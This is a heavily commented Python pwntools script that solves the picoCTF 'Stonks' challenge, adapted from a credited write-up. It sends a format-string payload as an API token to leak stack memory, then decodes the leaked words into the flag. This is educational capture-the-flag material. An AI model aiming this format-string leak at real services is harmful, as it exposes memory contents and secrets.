# picoCTF Binary Exploitation: Stonks

# Credits to K3RN3L4RMY
# View the original code: https://ctftime.org/writeup/28935
# You are view the modified version of K3RN3L4RMY code.

import re  # Import the regular expressions library for pattern matching
from pwn import *  # Import the pwntools library for binary exploitation

# Initialize an empty string to store the flag
flag = ""
addr = "sun.picoctf.net"
port = 1234

# Establish a remote connection to a server with specified address and port
p = remote(addr, port)

# Send the string "1" followed by a newline to the server
p.sendline(b"1")

# Wait for the server to send the prompt "What is your API token?" followed by a newline
p.recvuntil(b"What is your API token?\n")

# Send a payload to the server consisting of a format string with 30 occurrences of "%x-%x"
# send string to print stack
p.sendline(b"%x" + b"-%x"*30)

# Receive and discard one line of data from the server
p.recvline()

# Receive a line of data from the server and store it in variable 'x'
x = p.recvline()

# Remove the newline character at the end of 'x' and decode it from bytes to a string
x = x[:-1].decode()

# Split the 'x' string into a list using '-' as the delimiter
for i in x.split('-'):
    # Check if the length of the split part is 8 characters

    # This section handles the response from the server.
    # The payload sent to the server likely contained format string placeholders (%x)
    # to request the server to reveal values from its memory. These values are often in hexadecimal format.
    # The response is split into segments separated by '-'.
    # Each segment is expected to be 8 characters long, representing a 32-bit (4-byte) value.

    if len(i) == 8:
        # Convert the 8-character hex representation to a byte array

        # The received hex value is converted into a byte array.
        # Byte arrays are important for manipulating binary data, which is common in exploit development.

        a = bytearray.fromhex(i)

        # Iterate through the byte array in reverse order

        # The byte array is traversed in reverse order.
        # This is important because of the endianness of the system. In little-endian systems,
        # the least significant byte is stored first in memory, so reversing the order
        # is necessary to obtain the correct value.

        for b in reversed(a):
            # Check if the byte value is within the ASCII printable range

            # In cybersecurity terms, this section filters out non-printable characters.
            # It ensures that only characters within the ASCII printable range (32 to 127)
            # are considered valid. This filtering is important to extract meaningful data.

            if b > 32 and b < 128:
                # Convert the byte to a character and append it to the 'flag' string

                # Valid characters are converted from bytes to characters
                # and added to the 'flag' string. This is often done to reconstruct text-based
                # data that may have been hidden or obfuscated in the server's response.

                flag += chr(b)

# Define a regular expression pattern to search for the flag format "picoCTF{...}"

# A regular expression pattern is defined to search for a specific format.
# This pattern is used to identify the flag format "picoCTF{...}" in the extracted data.

pattern = r'picoCTF\{(.*?)\}'

# Search for the pattern in the 'flag' string
# A regular expression search is performed on the 'flag' string
# to find the flag format that matches "picoCTF{...}".

res = re.search(pattern, flag)
# If a match is found
# If the regular expression search successfully identifies the flag format,
# the following code is executed.

if res:
    # Print the flag enclosed in the "picoCTF{}" format

    # The extracted flag, enclosed in the "picoCTF{}" format,
    # is printed to the console. This format is common for indicating that the text is a flag.
    print("picoCTF{" + res.group(1) + "}")
